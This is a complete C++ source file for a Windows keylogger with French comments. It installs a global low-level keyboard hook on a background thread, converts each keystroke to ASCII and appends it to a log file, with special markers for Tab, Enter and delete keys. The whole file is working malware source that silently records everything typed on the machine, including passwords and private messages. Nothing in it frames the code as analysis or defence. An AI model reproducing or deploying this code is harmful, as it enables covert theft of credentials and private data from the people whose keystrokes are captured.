/*
 * Author: thirdstormofcythraul@outlook.com
 */
#include "keylogger.h"

#include <Windows.h>

#include "macro.h"

std::string Keylogger::filename;

HANDLE Keylogger::hThread = 0;

// Global instance du hook
HHOOK hKeyHook;

// Gestion du hook
__declspec(dllexport) LRESULT CALLBACK KeyEvent (int nCode, WPARAM wParam, LPARAM lParam ) {

	// Action du clavier et les touches tappées
	if  ((nCode == HC_ACTION) && (wParam == WM_KEYDOWN)) {

		// conversion du code -> ascii 
		BYTE KeyState[256];
		WORD wBuf;
		char ch;

		// Structure pour récupération des informations
		KBDLLHOOKSTRUCT hooked = *((KBDLLHOOKSTRUCT*)lParam);

		/* Traitement récupération dec codes des touches */

		// Etat du clavier
		GetKeyboardState(KeyState);

		// Conversion code > ascii
		ToAscii(hooked.vkCode, hooked.scanCode, KeyState, &wBuf, 0);

		FILE * pFile = 0;
		errno_t err;
		if((err = fopen_s(&pFile, Keylogger::filename.c_str(), "a")) != 0 ) {
			MYPRINTF("Can't open file !\n");
		} else {

			//on rajoute les touches non traitées par le hook
			switch(hooked.vkCode){
			case 9 :{
				fprintf(pFile, "<TAB>");
				break;
					}
			case 13 :{
				fprintf(pFile, "<ENTER>");
				break;
					 }
			case VK_BACK :{
				fprintf(pFile, "<delete>");
				break;
						  }
			case VK_DELETE: {
				fprintf(pFile, "<Suppr>");
				break;
							}
			default : {
				ch = ((char)wBuf); 
				fprintf(pFile, "%c", ch);
				break;
					  }
			}
			fclose(pFile);
		}

	}
	// Renvoi des messages au sytème
	return CallNextHookEx(hKeyHook, nCode, wParam, lParam);
}


// Boucle des messages 
void Keylogger::msgLoop()
{
	MSG message;
	while (GetMessage(&message, NULL, 0, 0)) {
		TranslateMessage(&message);
		DispatchMessage(&message);
	}
}

DWORD WINAPI Keylogger::keyLogger(LPVOID lpParameter)
{
	// Récuperation de l'instance de notre executable
	HINSTANCE hExe = GetModuleHandle(NULL);
	if (!hExe) return 1;

	// on demarre le hook
	hKeyHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)KeyEvent, hExe, NULL);
	if (hKeyHook == 0) {
		MYPRINTF("SetWindowsHookEx error\n");
	}

	// Boucle des messages
	msgLoop();

	// on desactive le hook
	if (UnhookWindowsHookEx(hKeyHook) == 0){
		MYPRINTF("UnhookWindowsHookExg error\n");
	}

	return 0;
}

bool Keylogger::startKeylogger(const char *filename){
	Keylogger::filename = filename;

	DWORD dwThread;

	Keylogger::hThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) keyLogger, (LPVOID)0, 0, &dwThread);

	return true;
}

bool Keylogger::stopKeylogger(){
	if (Keylogger::hThread == 0){
		return false;
	}
	return TerminateThread(Keylogger::hThread, 1) != 0;
}